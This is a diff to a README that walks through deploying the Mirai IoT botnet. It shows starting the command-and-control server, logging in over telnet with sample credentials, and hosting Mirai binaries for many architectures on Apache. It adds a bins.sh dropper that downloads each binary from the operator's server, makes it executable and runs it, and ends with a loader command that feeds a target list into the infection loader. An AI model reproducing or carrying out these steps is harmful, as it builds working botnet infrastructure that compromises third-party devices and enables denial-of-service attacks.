@@ -130,13 +130,79 @@ Once you restart the mysql server, go to your debug folder ./mirai/release, you 
 # cd ../mirai/release
 # sudo ./cnc
 ```
-Build loader
+Open a new window and execute the following command
 ```
-# cd ../loader
+# cd ..
+# cp prompt.txt release/
+```
+Then, use telnet to connect to your IP address.<br />
+The following is an example of running the telnet command.
+```
+# telnet 192.168.19.19
+```
+OK, well use this user name and password to login in this case the username is: `tashiro` and the password is: `mystrongestpassword`
+
+again in you server Terminal some like Putty or mobaxterm.<br />
+Go to this directory ../Mirai-Source-Code/mirai/release
+```
+# cd ./Mirai-Source-Code/mirai/release
+```
+Next, install and start the Apache server.
+```
+# sudo apt install apache2
+# sudo service apache2 start
+```
+copy the mirai files at the apache source.
+```
+# sudo cp mirai.* /var/www/html
+```
+well we need to delete the index to show the index file directory on browser.
+```
+# rm /var/www/html/index.html
+```
+Then open a browser and enter http://localhost or your IP address and see if the file appears.
+
+Go to /var/www/html and create bins.sh.
+```
+# cd /var/www/html
+# touch bins.sh
+```
+Then, open bins.sh and write the following
+```
+#!/bin/sh
+
+# Edit
+WEBSERVER="IP OR HOSTNAME:80"
+# Stop editing now 
+
+BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"
+
+for Binary in $BINARIES; do
+	wget http://$WEBSERVER/$Binary -O dvrHelper
+	chmod 777 dvrHelper
+	./dvrHelper
+done
+```
+If you have vps, please upload /var/www/html using sftp.<br />
+※If you do not have a vps, you may leave it as is.<br />
+Please check by yourself if it really uploaded, I don't know much about vps or anything like that.
+
+Now restart the Apache server.
+```
+# sudo service apache2 restart
+```
+Next, to build the loader, go to Mirai-Source-Code-plus/loader/ and build the loader.<br />
+※Omit commands to move.
+```
 # chmod +x build.sh
 # ./build.sh
 ```
-This completes the installation. :)
+and after than type this code but put you filename here --> file.txt before paste
+```
+# cat file.txt | ./loader wget http://dyn.com
+```
+This completes the installation. :)<br />
+Thank you for your hard work. Take a break and have a cup of coffee or something.
 
 ## How to use
 ※If you are not logged in as root, be sure to add sudo and follow these steps.
